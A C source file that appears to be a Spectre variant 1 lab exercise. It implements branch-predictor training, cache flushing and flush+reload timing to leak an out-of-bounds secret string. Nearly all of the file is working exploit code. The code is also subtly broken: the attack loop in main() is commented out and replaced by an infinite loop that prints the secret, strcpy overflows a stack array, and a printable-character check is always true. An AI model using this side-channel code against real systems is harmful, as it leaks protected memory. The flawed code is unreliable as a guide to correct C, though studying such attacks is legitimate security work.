#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = "SSHPassword123";   
uint8_t array[256*4096];
uint8_t scores[256];

#define CACHE_HIT_THRESHOLD (95)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD && i != 0){
      scores[i]++;
//	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
//      printf("The Secret = %d.\n",i);
    }
  } 
}
void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) { 
   _mm_clflush(&buffer_size);
   restrictedAccess(i); 
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 100; z++) { }
  // Ask restrictedAccess() to return the secret in out-of-order execution. 
  s = restrictedAccess(larger_x);  
  array[s*4096 + DELTA] += 88;  
}

int main() {
  char tmp_arr[strlen(secret)];
  while(1){
    for(int i = 0; i < strlen(secret); i++){
      tmp_arr[0] = 0;
    }
    strcpy(tmp_arr, secret);
    printf("%s\n", tmp_arr);
  }
/*
  flushSideChannel();
  //size_t larger_x = (size_t)(secret - (char*)buffer);  
  size_t larger_x = (size_t)(secret - (char*)buffer);  
  printf("0x%p\n", larger_x);
  for(int i = 0; i < 1024; i++){
    for(int j = 0; j < 256; j++){
      scores[j] = 0;
    }
    for(int j = 0; j < 1000; j++){
      spectreAttack(larger_x + i);
      reloadSideChannel();
    }
    int max = 0;
    for(int j = 0; j < 256; j++){
      if(scores[max] < scores[j]){
        max = j;
      }
    }
    if(max >= 32 || max <= 126){
      printf("  %c ", max);
    } else {
      printf("\\x%02x", max);
    }
    if(i % 18 == 17){ printf("\n"); }
*/
  printf("\n");
  return 0;
}
